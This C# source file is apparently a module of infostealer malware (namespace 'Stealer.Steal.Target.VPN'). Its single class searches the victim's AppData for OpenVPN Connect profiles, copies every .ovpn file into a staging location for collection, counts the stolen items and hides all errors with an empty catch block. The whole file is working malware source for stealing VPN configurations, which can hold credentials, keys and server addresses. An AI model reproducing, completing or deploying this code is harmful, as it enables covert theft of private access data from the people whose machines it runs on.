using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.VPN;

internal class OpenVpn
{
	public static void Start()
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			string path2 = Path.Combine("VPN", "OpenVPN Connect");
			string[] files = Directory.GetFiles(path);
			foreach (string path3 in files)
			{
				if (Path.GetExtension(path3).Contains("ovpn"))
				{
					Counter.Vpn++;
					DynamicFiles.WriteAllBytes(Path.Combine(path2, "profiles", Path.GetFileName(path3)), File.ReadAllBytes(path3));
				}
			}
		}
		catch
		{
		}
	}
}
